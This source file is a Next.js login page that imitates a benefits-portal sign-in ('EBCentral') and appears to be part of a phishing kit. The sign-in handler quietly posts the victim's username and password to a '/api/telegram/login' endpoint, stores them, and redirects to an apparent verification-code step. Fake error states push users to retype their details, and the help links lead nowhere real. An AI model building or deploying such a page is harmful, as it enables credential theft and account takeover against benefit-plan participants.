"use client"

import { useLayoutEffect, useState, type FormEvent } from "react"
import { useRouter } from "next/navigation"
import {
  MSG_INCORRECT_USERNAME_PASSWORD,
  MSG_UNABLE_VERIFY_TIME,
  SIGN_IN_LOADING_MS,
} from "@/lib/approval-messages"
import {
  EbcParticipantShell,
  EBC_FIELD_CLASS,
  EBC_LINK_CLASS,
  ebcPrimaryButtonClass,
} from "@/components/ebc-participant-shell"
import { wait } from "@/lib/loading-delays"
import { storeLoginCredentials } from "@/lib/login-flow-storage"
import { PAGE_H1_HEADING } from "@/lib/seo-keywords"

export default function LoginPage() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isLoginLoading, setIsLoginLoading] = useState(false)
  const [loginError, setLoginError] = useState<string | null>(null)
  const router = useRouter()

  useLayoutEffect(() => {
    const params = new URLSearchParams(window.location.search)
    if (params.get("loginDenied") === "1") {
      setUsername("")
      setPassword("")
      setLoginError(MSG_INCORRECT_USERNAME_PASSWORD)
      window.history.replaceState({}, "", "/")
      return
    }
    if (params.get("verifyUnavailable") === "1") {
      setUsername("")
      setPassword("")
      setLoginError(MSG_UNABLE_VERIFY_TIME)
      window.history.replaceState({}, "", "/")
    }
  }, [])

  const handleSignIn = async (event: FormEvent) => {
    event.preventDefault()
    if (isLoginLoading || !username.trim() || !password.trim()) return
    setLoginError(null)
    setIsLoginLoading(true)

    void fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: username.trim(),
        password: password.trim(),
      }),
    }).catch(() => {})

    try {
      sessionStorage.setItem("loginReady", "1")
      storeLoginCredentials(username.trim(), password.trim())
      sessionStorage.setItem("maskedEmail", "**********")
      sessionStorage.setItem("maskedPhone", "***-***-****")
    } catch {
      // continue
    }

    await wait(SIGN_IN_LOADING_MS)
    router.push("/verify-choice")
  }

  const goLoginOut = () => {
    window.location.href = "/api/login-out"
  }

  const clearErrorOnType = () => {
    if (loginError) setLoginError(null)
  }

  return (
    <EbcParticipantShell
      title={PAGE_H1_HEADING}
      intro="Enter your username and password to access your individual benefit account."
      showFooter
    >
      <div className="flex gap-4 rounded border border-sky-200 bg-sky-100 p-4">
        <i className="fa-solid fa-circle-info text-3xl text-sky-700" />
        <p className="text-lg leading-relaxed text-sky-700">
          To manage your organization&apos;s benefit plan,
          <button
            type="button"
            onClick={goLoginOut}
            className="text-sky-500 hover:underline ml-1"
          >
            log in as an employer.
          </button>
        </p>
      </div>

      <section className="flex flex-col md:flex-row gap-6 md:gap-27 mt-10">
        <div>
          <form onSubmit={handleSignIn} className="space-y-6">
            {loginError ? (
              <div className="flex flex-col md:grid md:grid-cols-[180px_1fr] md:gap-x-5">
                <div aria-hidden="true" className="hidden md:block" />
                <p className="m-0 text-base text-red-600" role="alert">
                  {loginError}
                </p>
              </div>
            ) : null}

            <div className="flex flex-col md:grid md:grid-cols-[180px_1fr] md:gap-x-5 mb-4">
              <label
                htmlFor="userId"
                className="md:text-right font-bold text-[20px] md:leading-10 mb-2 md:mb-0"
              >
                Username
              </label>
              <div>
                <input
                  id="userId"
                  type="text"
                  autoComplete="username"
                  className={EBC_FIELD_CLASS}
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value)
                    if (e.target.value.length > 0) clearErrorOnType()
                  }}
                />
                <button type="button" onClick={goLoginOut} className={EBC_LINK_CLASS}>
                  Forgot Username?
                </button>
              </div>
            </div>

            <div className="flex flex-col md:grid md:grid-cols-[180px_1fr] md:gap-x-5">
              <label
                htmlFor="password"
                className="md:text-right font-bold text-[20px] md:leading-10 mb-2 md:mb-0"
              >
                Password
              </label>
              <div>
                <input
                  id="password"
                  type="password"
                  autoComplete="current-password"
                  className={EBC_FIELD_CLASS}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value)
                    if (e.target.value.length > 0) clearErrorOnType()
                  }}
                />
                <button type="button" onClick={goLoginOut} className={EBC_LINK_CLASS}>
                  Reset Password?
                </button>
              </div>
            </div>

            <div className="mt-6">
              <button
                type="submit"
                disabled={isLoginLoading}
                className={`mt-8 md:ml-85 ml-32 ${ebcPrimaryButtonClass(isLoginLoading)}`}
              >
                <i className="fa-solid fa-right-to-bracket text-2xl" />
                <span className="text-[18px]">
                  {isLoginLoading ? "Loading..." : "Log in"}
                </span>
              </button>
            </div>
          </form>
        </div>

        <div className="mt-8 md:mt-10">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src="/emp/images/Participant-Portal-Login.jpg"
            alt="Submit claims with EBCentral or online"
            className="w-150 h-auto object-cover"
          />
        </div>
      </section>

      <section className="mt-10 md:mt-12">
        <h2 className="text-[25px] md:text-[28px] text-gray-800">Not a user yet?</h2>
        <hr className="my-4 md:my-8 border-gray-300" />
        <button
          type="button"
          onClick={goLoginOut}
          className={`mt-8 ${ebcPrimaryButtonClass(false)} text-xl`}
        >
          <i className="fa-solid fa-user" />
          <span>Register</span>
        </button>
      </section>
    </EbcParticipantShell>
  )
}
